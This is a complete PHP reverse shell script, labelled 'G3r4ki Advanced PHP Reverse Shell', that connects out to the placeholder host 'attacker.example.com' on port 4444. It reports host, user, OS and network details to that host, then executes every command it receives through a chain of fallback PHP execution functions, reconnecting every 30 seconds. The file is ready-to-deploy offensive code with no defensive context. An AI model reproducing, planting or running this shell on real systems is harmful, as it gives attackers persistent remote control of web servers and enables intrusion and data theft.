<?php
// G3r4ki Advanced PHP Reverse Shell

// Configuration
$ip = 'attacker.example.com';     // Listener IP
$port = 4444;   // Listener Port
$retry_delay = 30;  // Retry connection every X seconds
$shell_cmd = PHP_OS === 'WINNT' ? 'cmd.exe' : '/bin/sh';

// System info gathering
function get_system_info() {
    $info = [
        'Host' => php_uname('n'),
        'OS' => php_uname('s') . ' ' . php_uname('r'),
        'User' => get_current_user(),
        'PHP' => phpversion(),
        'CWD' => getcwd(),
    ];
    
    // Get IP address
    if (function_exists('shell_exec')) {
        $ip_cmd = PHP_OS === 'WINNT' ? 'ipconfig' : 'ifconfig || ip a';
        $ip_info = shell_exec($ip_cmd);
        $info['Network'] = preg_replace('/\s+/', ' ', $ip_info);
    }
    
    return $info;
}

// Create a reverse shell connection
function create_reverse_shell($ip, $port, $retry_delay, $shell_cmd) {
    // Keep trying to connect
    while (true) {
        $socket = @fsockopen($ip, $port, $errno, $errstr, 30);
        
        if ($socket) {
            $system_info = get_system_info();
            fwrite($socket, "--- G3r4ki PHP Reverse Shell Connected ---\n");
            foreach ($system_info as $key => $value) {
                fwrite($socket, "$key: $value\n");
            }
            fwrite($socket, "-------------------------------------------\n\n");
            
            // Execute commands
            while (!feof($socket)) {
                // Read command
                $command = trim(fgets($socket));
                
                // Exit command
                if ($command == 'exit') {
                    break;
                }
                
                // Execute command
                if (function_exists('system')) {
                    ob_start();
                    system("$command 2>&1", $return_value);
                    $output = ob_get_contents();
                    ob_end_clean();
                } elseif (function_exists('shell_exec')) {
                    $output = shell_exec("$command 2>&1");
                } elseif (function_exists('exec')) {
                    exec("$command 2>&1", $output_array, $return_value);
                    $output = implode("\n", $output_array);
                } elseif (function_exists('passthru')) {
                    ob_start();
                    passthru("$command 2>&1", $return_value);
                    $output = ob_get_contents();
                    ob_end_clean();
                } elseif (function_exists('proc_open')) {
                    $descriptorspec = array(
                       0 => array("pipe", "r"),
                       1 => array("pipe", "w"),
                       2 => array("pipe", "w")
                    );
                    $process = proc_open($command, $descriptorspec, $pipes);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[0]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                } else {
                    $output = "Command execution not available";
                }
                
                fwrite($socket, $output . "\n");
            }
            
            fclose($socket);
        }
        
        // Wait before retry
        sleep($retry_delay);
    }
}

// Start reverse shell
create_reverse_shell($ip, $port, $retry_delay, $shell_cmd);
?>